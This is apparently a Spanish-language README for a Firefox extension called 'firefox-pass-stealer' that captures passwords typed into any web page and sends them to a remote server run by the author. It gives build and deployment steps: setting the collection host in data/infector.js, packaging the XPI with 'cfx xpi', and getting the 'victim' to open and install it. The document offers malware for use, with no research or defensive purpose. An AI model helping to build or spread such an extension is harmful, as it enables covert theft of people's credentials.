# firefox-pass-stealer
Esta extensión permite capturar las contraseñas enviadas en cualquier página web, y entregárnoslas a nosotros remotamente.

### Preparar
Antes de generar el XPI, se debe modificar la primera línea del archivo data/infector.js y modificar la variable host con la URL que se va a llamar cuando se capture una contraseña. Se recomienda el servidor use web2py con la aplicación web2py-pass-stealer

### Generar XPI
Para generar el archivo XPI que nos permite hacer portable la extensión se debe ejecutar el siguiente comando:
`cfx xpi`
Asegurarse de tener instalado el [SDK de complementos de Firefox](https://addons.mozilla.org/es/developers/builder)

### Instalación
Una vez generado el XPI, nuestra víctima debe abrir este fichero y confirmar su instalación

